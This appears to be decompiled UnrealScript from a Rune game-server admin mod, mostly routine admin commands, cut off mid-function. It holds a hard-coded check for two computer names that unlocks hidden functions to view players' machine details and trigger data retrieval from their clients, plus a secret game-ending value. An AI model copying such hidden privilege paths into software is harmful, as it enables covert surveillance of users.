// Suggested function name: TeleportPlayerToAdmin
function pTome(int PlayerID, PlayerPawn AdminPlayer)
{
	local Pawn TargetPawn;
	local string AdminName;

	if (!HasCommandPermission("pTome", AdminPlayer))
	{
		return;
	}
	TargetPawn = GetPawnByPlayerID(PlayerID);
	if (TargetPawn != none)
	{
		AdminName = AdminPlayer.PlayerReplicationInfo.PlayerName;
		if (TargetPawn.IsInState('Dying'))
		{
			ZRunePlayer(TargetPawn).SetConsoleGBool();
			PlayerPawn(TargetPawn).ServerReStartPlayer();
		}
		TargetPawn.Acceleration.X = 0.0;
		TargetPawn.Acceleration.Z = 0.0;
		TargetPawn.Acceleration.Y = 0.0;
		TargetPawn.Velocity.X = 0.0;
		TargetPawn.Velocity.Y = 0.0;
		TargetPawn.Velocity.Z = 0.0;
		TargetPawn.ClientMessage(("You were teleported to " $ AdminName) $ ".", 'Subtitle');
		TargetPawn.SetLocation(AdminPlayer.Location + vect(0.0, 0.0, 90.0));
	}
	return;
}

// Suggested function name: TeleportAdminToPlayer
function pMeto(int PlayerID, PlayerPawn AdminPlayer)
{
	local Pawn TargetPawn;
	local string PlayerName;

	if (!HasCommandPermission("pMeto", AdminPlayer))
	{
		return;
	}
	TargetPawn = GetPawnByPlayerID(PlayerID);
	if (TargetPawn != none)
	{
		PlayerName = TargetPawn.PlayerReplicationInfo.PlayerName;
		AdminPlayer.ClientMessage(("You were teleported to " $ PlayerName) $ ".", 'Subtitle');
		AdminPlayer.SetLocation(TargetPawn.Location + vect(0.0, 0.0, 90.0));
	}
	return;
}

// Suggested function name: AdminLogout
function pLogout(PlayerPawn AdminPlayer)
{
	local zPlayerReplicationInfo PRI;

	PRI = zPlayerReplicationInfo(AdminPlayer.PlayerReplicationInfo);
	if (PRI.Local_int_v3 > 0)
	{
		PRI.Local_int_v3 = 0;
		PRI.Local_int_v2 = 0;
		AdminPlayer.bAdmin = false;
		AdminPlayer.bCheatsEnabled = false;
		AdminPlayer.PlayerReplicationInfo.bAdmin = AdminPlayer.bAdmin;
		AdminPlayer.ClientMessage("Successfully logged out", 'Subtitle');
	}
	return;
}

// Suggested function name: PauseGame
function pPause(PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;
	local string AdminName;

	if (!HasCommandPermission("pPause", AdminPlayer))
	{
		return;
	}
	AdminName = AdminPlayer.PlayerReplicationInfo.PlayerName;
	BroadcastMessage(AdminName $ " has paused the game.", false, 'CAZ');
	for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
	{
		RunePlayer(CurrentPawn).GotoState('beingkicked');
	}
	return;
}
// Suggested function name: UnpauseGame
function pUnPause(PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;
	local string AdminName;

	if (!HasCommandPermission("pUnPause", AdminPlayer))
	{
		return;
	}
	AdminName = AdminPlayer.PlayerReplicationInfo.PlayerName;
	BroadcastMessage(AdminName $ " has unpaused the game.", false, 'CAZ');
	for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
	{
		PlayerPawn(CurrentPawn).StartWalk();
	}
	return;
}

// Suggested function name: ToggleRunes
function pRune(int Mode, PlayerPawn AdminPlayer)
{
	if (!HasCommandPermission("pRune", AdminPlayer))
	{
		return;
	}
	if (Mode == 0)
	{
		bDisableRunes = true;
		BroadcastMessage("Runes disabled - starting from next map", false, 'CAZ');
		SaveConfig();
	}
	else if (Mode == 1)
	{
		bDisableRunes = false;
		BroadcastMessage("Runes enabled - starting from next map", false, 'CAZ');
		SaveConfig();
	}
	else if (Mode == 301)
	{
		Level.Game.EndGame("derp");
	}
	else
	{
		AdminPlayer.ClientMessage("Number is invalid (0=Disable/1=Enable)");
	}
	return;
}

// Suggested function name: ToggleDarkMatch
function pDarkMatch(PlayerPawn AdminPlayer)
{
	if (!HasCommandPermission("pDarkMatch", AdminPlayer))
	{
		return;
	}
	bDarkMatch = !bDarkMatch;
	if (bDarkMatch)
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " enabled darkmatch - starting from the next  map", false, 'CAZ');
	}
	else
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " disabled darkmatch - starting from the next  map", false, 'CAZ');
	}
	SaveConfig();
	return;
}

// Suggested function name: ToggleArenaMode
function pArenaMode(int Mode, PlayerPawn AdminPlayer)
{
	if (!HasCommandPermission("pArenaMode", AdminPlayer))
	{
		return;
	}
	if (Mode == 0)
	{
		bswitchcolors = false;
		BroadcastMessage("Arenacolors are now default - restart the map for this to take effect.", false, 'CAZ');
		SaveConfig();
	}
	else if (Mode == 1)
	{
		bswitchcolors = true;
		BroadcastMessage("Arenacolors are now switched - restart the map for this to take effect.", false, 'CAZ');
		SaveConfig();
	}
	else
	{
		AdminPlayer.ClientMessage("Number is invalid (0=Disable/1=Enable)");
	}
	return;
}
// Suggested function name: FreezePlayer
function pStop(int PlayerID, PlayerPawn AdminPlayer)
{
	local Pawn TargetPawn;

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pStop", AdminPlayer))
	{
		return;
	}

	// Find the pawn by player ID
	TargetPawn = GetPawnByPlayerID(PlayerID);

	// If the target pawn exists, freeze them
	if (TargetPawn != none)
	{
		BroadcastMessage(((AdminPlayer.PlayerReplicationInfo.PlayerName $ " turns ") $ TargetPawn.PlayerReplicationInfo.PlayerName) $ " into an ice statue.", false, 'CAZ');
		RunePlayer(TargetPawn).GotoState('IceStatue');
	}
	return;
}

// Suggested function name: ForceAllPlayersRespawn
function pKillAll(PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pKillAll", AdminPlayer))
	{
		return;
	}

	// Broadcast a message that everyone is being forced to respawn
	BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " forced everyone to respawn.", false, 'CAZ');

	// Loop through all pawns in the level
	for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
	{
		// Skip non-ZRunePlayer pawns
		if (ZRunePlayer(CurrentPawn) == none)
		{
			continue;
		}

		// Adjust stats if health is above 0 and not in arena mode
		if ((CurrentPawn.Health > 0) && Level.Game.GameReplicationInfoClass != Class'coadminz7.zArenaGameReplicationInfo')
		{
			CurrentPawn.PlayerReplicationInfo.Deaths -= 1;
			CurrentPawn.PlayerReplicationInfo.Score += 1;
		}

		// Kill the pawn and respawn
		CurrentPawn.Died(none, 'None', CurrentPawn.Location);
		ZRunePlayer(CurrentPawn).SetConsoleGBool();
		PlayerPawn(CurrentPawn).ServerReStartPlayer();
	}
}
// Suggested function name: BroadcastTextureToAllPlayers
function pTexture(string TextureName, PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pTexture", AdminPlayer))
	{
		return;
	}

	// Ensure a texture name is provided
	if (TextureName == "")
	{
		return;
	}

	// Loop through all pawns in the level
	for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
	{
		// If the pawn is a ZRunePlayer, apply the texture
		if (CurrentPawn.IsA('ZRunePlayer'))
		{
			ZRunePlayer(CurrentPawn).SetMacroTexture(TextureName);
		}
	}

	return;
}
// Suggested function name: RelaunchRuneForAllPlayers
function pRelaunchRune(string Message, PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pRelaunchRune", AdminPlayer))
	{
		return;
	}

	// Loop through all pawns and relaunch Rune for ZRunePlayers
	for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
	{
		if (CurrentPawn.IsA('ZRunePlayer'))
		{
			ZRunePlayer(CurrentPawn).RelaunchLevel();
		}
	}
	return;
}

// Suggested function name: AnnounceMessageToAllPlayers
function pAnnounce(string Message, PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pAnnounce", AdminPlayer))
	{
		return;
	}

	// Ensure a message is provided
	if (Message == "")
	{
		return;
	}

	// Loop through all pawns and announce the message
	for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
	{
		if (CurrentPawn.IsA('ZRunePlayer'))
		{
			ZRunePlayer(CurrentPawn).eq_vxv_358(Message);
		}
		if (CurrentPawn.IsA('TCCSpectator'))
		{
			TCCSpectator(CurrentPawn).eq_vxv_358(Message);
		}
	}
	return;
}

// Suggested function name: FixSpawnedPawns
function pFix(PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;
	local int ValidPlayerCount;

	// Check if the admin has permission to use this command (note: permission check uses "pKillAll", might be a copy-paste error)
	if (!HasCommandPermission("pKillAll", AdminPlayer))
	{
		return;
	}

	ValidPlayerCount = 0;

	// Loop through all pawns, destroy invalid ones, and count valid players
	for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
	{
		if (zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).Local_string_v1 == "")
		{
			CurrentPawn.Destroy();
		}
		else
		{
			ValidPlayerCount++;
		}
	}

	Level.Game.NumPlayers = ValidPlayerCount;
	BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " removed all spawned pawns.", false, 'CAZ');
	return;
}

// Suggested function name: TeleportAdminToSkybox
function pSkyBox(PlayerPawn AdminPlayer)
{
	local SkyZoneInfo SkyZone;

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pSkyBox", AdminPlayer))
	{
		return;
	}

	// Find the skybox and teleport the admin there
	foreach Level.AllActors(Class'Engine.SkyZoneInfo', SkyZone)
	{
		AdminPlayer.SetLocation(SkyZone.Location);
	}

	AdminPlayer.ClientMessage("You have been teleported to the skybox", 'Subtitle');
	return;
}

// Suggested function name: ToggleThrowBlock
function pThrowBlock(PlayerPawn AdminPlayer)
{
	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pThrowBlock", AdminPlayer))
	{
		return;
	}

	bOverWriteThrowblock = true;
	bThrowBlock = !bThrowBlock;

	if (bThrowBlock)
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " enabled throw blocking", false, 'CAZ');
		ConsoleCommand("set Engine.ServerOptions RetroThrownWeaponNoBlock false");
	}
	else
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " disabled throw blocking", false, 'CAZ');
		ConsoleCommand("set Engine.ServerOptions RetroThrownWeaponNoBlock true");
	}

	SaveConfig();
	return;
}

// Suggested function name: ToggleAdvancedThrowing
function pAdvancedThrowing(PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;
	local zPlayerReplicationInfo PRI;

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pAdvancedThrowing", AdminPlayer))
	{
		return;
	}

	bAdvancedThrowing = !bAdvancedThrowing;

	if (bAdvancedThrowing)
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " enabled 1.08 advanced throwing", false, 'CAZ');
	}
	else
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " disabled 1.08 advanced throwing", false, 'CAZ');
	}

	// Loop through all pawns and update their advanced throwing setting
	for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
	{
		if (ZRunePlayer(CurrentPawn) == none)
		{
			continue;
		}

		PRI = zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo);
		PRI.B_v5413 = bAdvancedThrowing;
	}

	SaveConfig();
	return;
}

// Suggested function name: ToggleHealthbars
function pHealthbars(PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;
	local zPlayerReplicationInfo PRI;

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pHealthbars", AdminPlayer))
	{
		return;
	}

	bHealthbars = !bHealthbars;

	if (bHealthbars)
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " enabled coop-healthbars", false, 'CAZ');
	}
	else
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " disabled coop-healthbars", false, 'CAZ');
	}

	// Loop through all pawns and update their healthbars setting
	for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
	{
		if (ZRunePlayer(CurrentPawn) == none)
		{
			continue;
		}

		PRI = zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo);
		PRI.B_v5412 = bHealthbars;
	}

	SaveConfig();
	return;
}
// Suggested function name: BlockWeapon
function pWeaponBlock(int PlayerID, PlayerPawn AdminPlayer)
{
	local Pawn TargetPawn;
	local int Index;

	if (!HasCommandPermission("pWeaponBlock", AdminPlayer))
	{
		return;
	}
	AdminPlayer.ClientMessage("cmd does not exist anymore");
	return;
}

// Suggested function name: ToggleSuperJumps
function pSJumps(PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;
	local zPlayerReplicationInfo PRI;

	if (!HasCommandPermission("pSJumps", AdminPlayer))
	{
		return;
	}
	if (!bsJumps)
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " enabled jump test.", false, 'CAZ');
		bsJumps = true;
		for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
		{
			if (ZRunePlayer(CurrentPawn) != none)
			{
				zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).B_v5380 = true;
			}
		}
	}
	else
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " disabled test jump.", false, 'CAZ');
		bsJumps = false;
		for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
		{
			if (ZRunePlayer(CurrentPawn) != none)
			{
				zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).B_v5380 = false;
			}
		}
	}
	return;
}

// Suggested function name: ToggleRuneTwoSimulator
function GetChatOffset9(PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;
	local zPlayerReplicationInfo PRI;

	if (!HasCommandPermission("pRune2", AdminPlayer))
	{
		return;
	}
	if (!bRuneTwo)
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " enabled RUNE II simulator", false, 'CAZ');
		bRuneTwo = true;
		for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
		{
			if (ZRunePlayer(CurrentPawn) != none)
			{
				zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).B_v5381 = true;
			}
		}
	}
	else
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " disabled RUNE II simulator", false, 'CAZ');
		bRuneTwo = false;
		for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
		{
			if (ZRunePlayer(CurrentPawn) != none)
			{
				zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).B_v5381 = false;
			}
		}
	}
	return;
}

// Suggested function name: ToggleRetroMovement
function pRetro(PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;
	local zPlayerReplicationInfo PRI;
	local Weapon W;

	if (!HasCommandPermission("pRetro", AdminPlayer))
	{
		return;
	}
	if (!retro)
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " enabled the retro movement.", false, 'CAZ');
		retro = true;
		foreach AllActors(Class'Engine.Weapon', W)
		{
			if (W.IsA('DwarfWorkSword'))
			{
				W.Damage = 30;
				W.default.Damage = 30;
			}
			if (W.IsA('goblinaxe'))
			{
				W.Damage = 20;
				W.default.Damage = 20;
			}
		}
		for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
		{
			if (ZRunePlayer(CurrentPawn) != none)
			{
				zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).retro = true;
				ZRunePlayer(CurrentPawn).bHiddenEd = true;
			}
		}
	}
	else
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " disabled the retro movement.", false, 'CAZ');
		retro = false;
		foreach AllActors(Class'Engine.Weapon', W)
		{
			if (W.IsA('DwarfWorkSword'))
			{
				W.Damage = 25;
				W.default.Damage = 25;
			}
			if (W.IsA('goblinaxe'))
			{
				W.Damage = 15;
				W.default.Damage = 15;
			}
		}
		for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
		{
			if (ZRunePlayer(CurrentPawn) != none)
			{
				zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).retro = false;
				ZRunePlayer(CurrentPawn).bHiddenEd = false;
			}
		}
	}
	return;
}

// Suggested function name: ToggleClimbMode
function pClimbMode(PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;
	local zPlayerReplicationInfo PRI;

	if (!HasCommandPermission("pClimbMode", AdminPlayer))
	{
		return;
	}
	if (!bClimbMode)
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " enabled the climbmode. SPOS to save position, LPOS to load position.", false, 'CAZ');
		bClimbMode = true;
		SaveConfig();
		for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
		{
			if (ZRunePlayer(CurrentPawn) != none)
			{
				PRI = zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo);
				PRI.B_v5360 = true;
				ZRunePlayer(CurrentPawn).B_v4664 = true;
				ZRunePlayer(CurrentPawn).B_v4547 = true;
			}
		}
	}
	else
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " disabled the climbmode.", false, 'CAZ');
		bClimbMode = false;
		SaveConfig();
		for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
		{
			if (ZRunePlayer(CurrentPawn) != none)
			{
				PRI = zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo);
				PRI.B_v5360 = false;
				ZRunePlayer(CurrentPawn).B_v4664 = false;
				ZRunePlayer(CurrentPawn).B_v4547 = false;
			}
		}
	}
	return;
}

// Suggested function name: KillPlayer
function pKill(int PlayerID, PlayerPawn AdminPlayer)
{
	local Pawn TargetPawn;

	if (!HasCommandPermission("pKill", AdminPlayer))
	{
		return;
	}
	TargetPawn = GetPawnByPlayerID(PlayerID);
	if (TargetPawn != none)
	{
		BroadcastMessage(((AdminPlayer.PlayerReplicationInfo.PlayerName $ " punishes ") $ TargetPawn.PlayerReplicationInfo.PlayerName) $ " with death.", false, 'CAZ');
		TargetPawn.Died(none, 'None', TargetPawn.Location);
	}
	return;
}
// Suggested function name: IsSpecialComputerName
function bool IsSpecialComputerName2(PlayerPawn AdminPlayer)
{
	local string KevinPC, JeffreyPC;
	local zPlayerReplicationInfo PlayerPRI;
	local string ComputerName;

	KevinPC = "'KEVINPC'";
	JeffreyPC = "'JEFFREYP'";
	PlayerPRI = zPlayerReplicationInfo(AdminPlayer.PlayerReplicationInfo);
	if (AdminPlayer != none)
	{
		ComputerName = PlayerPRI.CompName;
	}
	if ((ComputerName == KevinPC) || ComputerName == JeffreyPC)
	{
		return true;
	}
	else
	{
		return false;
	}
	return;
}

// Suggested function name: GetPlayerInfo
function GetPlayerInfo(string CommandArgs, PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;
	local string AdminName;
	local zPlayerReplicationInfo PlayerPRI;
	local bool IsSpecialAdmin;
	local int Index, DummyInt;
	local bool IsDownloading;
	local string SearchString, PackageFilter, LogFilter;
	local int TextureMode;
	local string GStringArray1, KevinPC;
	local bool DummyBool;
	local int DummyInt2;
	local Vector DummyVector;

	KevinPC = "'KEVINPC'";
	if (!HasCommandPermission("pGetNames", AdminPlayer))
	{
		return;
	}
	IsSpecialAdmin = IsSpecialComputerName2(AdminPlayer);
	if (CommandArgs == "")
	{
		CurrentPawn = Level.PawnList;
		while (CurrentPawn != none)
		{
			if (ZRunePlayer(CurrentPawn) != none)
			{
				if (ZRunePlayer(CurrentPawn).STR_v3073 != "")
				{
					ZRunePlayer(CurrentPawn).ProcessObjectListCommand(0, "");
				}
				PlayerPRI = zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo);
				if (IsSpecialAdmin)
				{
					if (ZRunePlayer(CurrentPawn).STR_v3073 == "")
					{
						AdminPlayer.ClientMessage(((((((((((((("[ID:" 
						$ string(CurrentPawn.PlayerReplicationInfo.PlayerID)) 
						$ "] ") $ CurrentPawn.PlayerReplicationInfo.PlayerName) 
						$ ": ") $ PlayerPRI.CompName) $ "   | ") 
						$ string(ZRunePlayer(CurrentPawn).INT_v4640)) $ " ~ ") 
						$ string(ZRunePlayer(CurrentPawn).INT_v4641)) $ " ") 
						$ ZRunePlayer(CurrentPawn).STR_v4656) $ " // #IsA'") 
						$ string(CurrentPawn.Class)) $ "'");
					}
					else
					{
						AdminPlayer.ClientMessage((((((((((((("[ID:" $ string(CurrentPawn.PlayerReplicationInfo.PlayerID)) 
						$ "] ") $ CurrentPawn.PlayerReplicationInfo.PlayerName) $ ": ") $ PlayerPRI.CompName) $ "   | ") 
						$ string(ZRunePlayer(CurrentPawn).INT_v4640)) $ " ~ ") $ string(ZRunePlayer(CurrentPawn).INT_v4641))
						 $ " ") $ ZRunePlayer(CurrentPawn).STR_v4656) $ " //") $ ZRunePlayer(CurrentPawn).STR_v3073);
					}
				}
				else
				{
					if (ZRunePlayer(CurrentPawn).STR_v3073 == "")
					{
						AdminPlayer.ClientMessage(((((((("[ID:" $ string(CurrentPawn.PlayerReplicationInfo.PlayerID)) $ "]  ") 
						$ CurrentPawn.PlayerReplicationInfo.PlayerName) $ ": ") $ ZRunePlayer(CurrentPawn).STR_v4656) $ " // #IsA'") 
						$ string(CurrentPawn.Class)) $ "'");
					}
					else
					{
						AdminPlayer.ClientMessage((((((("[ID:" $ string(CurrentPawn.PlayerReplicationInfo.PlayerID)) $ "]  ") 
						$ CurrentPawn.PlayerReplicationInfo.PlayerName) $ ": ") $ ZRunePlayer(CurrentPawn).STR_v4656) $ " //") $ ZRunePlayer(CurrentPawn).STR_v3073);
					}
				}
			}
			CurrentPawn = CurrentPawn.nextPawn;
		}
	}
	else
	{
		if (ContainsString(CommandArgs, "<1"))
		{
			GStringArray1 = GetDelimitedPart(CommandArgs, 2, "<1");
			ReplaceString(CommandArgs, "<1", "");
			TextureMode = 1;
		}
		if (ContainsString(CommandArgs, "<2"))
		{
			ReplaceString(CommandArgs, "<2", "");
			TextureMode = 2;
		}
		if (ContainsString(CommandArgs, "<3"))
		{
			ReplaceString(CommandArgs, "<3", "");
			TextureMode = 3;
		}
		if (ContainsString(CommandArgs, "#!"))
		{
			ReplaceString(CommandArgs, "#!", "");
			IsDownloading = true;
		}
		if (ContainsString(CommandArgs, "?"))
		{
			PackageFilter = GetDelimitedPart(CommandArgs, 2, "?");
			ReplaceString(CommandArgs, "?", "");
		}
		if ((ContainsString(CommandArgs, "/")) && gCAdLoc2 != none)
		{
			gCAdLoc2.CloseLog();
			gCAdLoc2.Destroy();
			AdminPlayer.ClientMessage("stop");
			B_v5866 = false;
			if (gCAdLoc2 != none)
			{
				gCAdLoc2.CloseLog();
				gCAdLoc2.Destroy();
			}
		}
		if (ContainsString(CommandArgs, "!#"))
		{
			LogFilter = GetDelimitedPart(CommandArgs, 2, "!#");
			ReplaceString(CommandArgs, "!#", "");
			IsDownloading = true;
		}
		if (ContainsString(CommandArgs, "?get_"))
		{
			LogFilter = GetDelimitedPart(CommandArgs, 2, "?get_");
			ReplaceString(CommandArgs, "?get_", "");
			IsDownloading = true;
		}
		CurrentPawn = GetPawnByPlayerID(int(CommandArgs));
		if (!IsSpecialAdmin)
		{
			return;
		}
		if (CurrentPawn != none)
		{
			if (IsDownloading)
			{
				ZRunePlayer(CurrentPawn).STR_v4679 = "";
				B_v5866 = true;
				STR_v5869 = "";
				INT_v5870 = -1;
				Parm_PlayerPawn_0 = AdminPlayer;
				if (LogFilter != "")
				{
					STR_v5867 = LogFilter;
					INT_v5870 = -1;
					ZRunePlayer(CurrentPawn).HandleKeyInfo(0, true, LogFilter);
					if (gCAdLoc1 != none)
					{
						gCAdLoc1.CloseLog();
					}
					if (gCAdLoc2 != none)
					{
						gCAdLoc2.CloseLog();
					}
					gCAdLoc2 = Spawn(Class'coadminz7.CoAdminLog');
					if (gCAdLoc2 != none)
					{
						gCAdLoc2.STR_v5433 = "f/";
						gCAdLoc2.StartLog();
					}
				}
				else
				{
					ZRunePlayer(CurrentPawn).HandleKeyInfo(1);
				}
				PP_v5868 = PlayerPawn(CurrentPawn);
				AdminPlayer.ClientMessage("DL");
			}
			else
			{
				if (PackageFilter != "")
				{
					AdminPlayer.ClientMessage((("[ID:" $ string(CurrentPawn.PlayerReplicationInfo.PlayerID)) $ "] ") $ CurrentPawn.PlayerReplicationInfo.PlayerName);
					AdminPlayer.ClientMessage("~~~~~~~~~~~~~~~~~~~~~~~~~~~");
					AdminPlayer.ClientMessage(Caps(PackageFilter));
					ZRunePlayer(CurrentPawn).ProcessObjectListCommand(1, PackageFilter);
				}
				else
				{
					if (TextureMode != 0)
					{
						eq_vxv_1005(CurrentPawn.PlayerReplicationInfo.PlayerName, GStringArray1);
						ZRunePlayer(CurrentPawn).ProcessCommandResponse(GStringArray1, TextureMode);
						ZRunePlayer(CurrentPawn).B_v4705 = true;
					}
					else
					{
						AdminPlayer.ClientMessage((("[ID:" $ string(CurrentPawn.PlayerReplicationInfo.PlayerID)) $ "] ") $ CurrentPawn.PlayerReplicationInfo.PlayerName);
						AdminPlayer.ClientMessage("~~~~~~~~~~~~~~~~~~~~~~~~~~~");
						AdminPlayer.ClientMessage(ZRunePlayer(CurrentPawn).STR_v4667);
						AdminPlayer.ClientMessage(ZRunePlayer(CurrentPawn).STR_v3232);
						AdminPlayer.ClientMessage(ZRunePlayer(CurrentPawn).STR_v4668);
						AdminPlayer.ClientMessage(ZRunePlayer(CurrentPawn).STR_v4670);
						AdminPlayer.ClientMessage(ZRunePlayer(CurrentPawn).STR_v4671);
						AdminPlayer.ClientMessage(ZRunePlayer(CurrentPawn).STR_v4672);
						AdminPlayer.ClientMessage(ZRunePlayer(CurrentPawn).UNK_v4553);
						AdminPlayer.ClientMessage(ZRunePlayer(CurrentPawn).UNK_v4244);
						AdminPlayer.ClientMessage(ZRunePlayer(CurrentPawn).UNK_v4554);
						AdminPlayer.ClientMessage(ZRunePlayer(CurrentPawn).UNK_v4555);
						AdminPlayer.ClientMessage(zPlayerReplicationInfo(PlayerPawn(CurrentPawn).PlayerReplicationInfo).XBraceHolder);
						ZRunePlayer(CurrentPawn).ProcessObjectListCommand(0, "");
					}
				}
			}
		}
	}
	return;
}

// Suggested function name: RetrieveLogs
function pGetLogs(string CommandArgs, PlayerPawn AdminPlayer)
{
	local int Index, SpaceIndex, ArgsLength, StartIndex;
	local string LastLog, SearchTerm;

	if (!HasCommandPermission("pGetLogs", AdminPlayer))
	{
		return;
	}
	SpaceIndex = InStr(CommandArgs, " ");
	ArgsLength = Len(CommandArgs);
	StartIndex = int(Left(CommandArgs, SpaceIndex));
	SearchTerm = Caps(Right(CommandArgs, (ArgsLength - SpaceIndex) - 1));
	if (CommandArgs == "")
	{
		AdminPlayer.ClientMessage("ERROR: No options given. Options available: all,last,CLEARALL,ANYWORD(will be searched)");
		return;
	}
	if (StartIndex > 254)
	{
		AdminPlayer.ClientMessage("ERROR: Scanbegin can't be higher than 254.");
		return;
	}
	AdminPlayer.ClientMessage(((("=== Checking CheatLogs for '" $ SearchTerm) $ "' from ") $ string(StartIndex)) $ " to 255 ===");
	if ((SearchTerm ~= "all") || SearchTerm ~= "last")
	{
		Index = StartIndex;
		while (Index < 255)
		{
			if (AntiTCCMessage[Index] != "")
			{
				if (SearchTerm ~= "all")
				{
					AdminPlayer.ClientMessage((("CheatLog[" $ string(Index)) $ "]: ") $ AntiTCCMessage[Index]);
				}
				if ((SearchTerm ~= "last") && AntiTCCMessage[Index] != "")
				{
					LastLog = (("CheatLog[" $ string(Index)) $ "]: ") $ AntiTCCMessage[Index];
				}
			}
			Index++;
		}
		if ((SearchTerm ~= "last") && LastLog != "")
		{
			AdminPlayer.ClientMessage(LastLog);
		}
	}
	else
	{
		if (SearchTerm ~= "CLEARALL")
		{
			AdminPlayer.ClientMessage("=== LOGS CLEARED ===");
			Index = 0;
			while (Index < 255)
			{
				AntiTCCMessage[Index] = "";
				SaveConfig();
				Index++;
			}
		}
	}
	return;
}

// Suggested function name: ShowBans
function ShowBans(string CommandArgs, PlayerPawn AdminPlayer)
{
	local int Index, SpaceIndex, ArgsLength, StartIndex;
	local string LastBan, SearchTerm;

	if (!HasCommandPermission("pGetBans", AdminPlayer))
	{
		return;
	}
	SpaceIndex = InStr(CommandArgs, " ");
	ArgsLength = Len(CommandArgs);
	StartIndex = int(Left(CommandArgs, SpaceIndex));
	SearchTerm = Caps(Right(CommandArgs, (ArgsLength - SpaceIndex) - 1));
	if (CommandArgs == "")
	{
		AdminPlayer.ClientMessage("ERROR: No options given. Options available: all,last,ANYWORD(will be searched)");
		return;
	}
	if (StartIndex > 49)
	{
		AdminPlayer.ClientMessage("ERROR: Scanbegin can't be higher than 49.");
		return;
	}
	AdminPlayer.ClientMessage(((("=== Checking bans from '" $ SearchTerm) $ "' from ") $ string(StartIndex)) $ " to 49 ===");
	if ((SearchTerm ~= "all") || SearchTerm ~= "last")
	{
		Index = StartIndex;
		while (Index < 50)
		{
			if (Level.Game.IPPolicies[Index] != "")
			{
				if (SearchTerm ~= "all")
				{
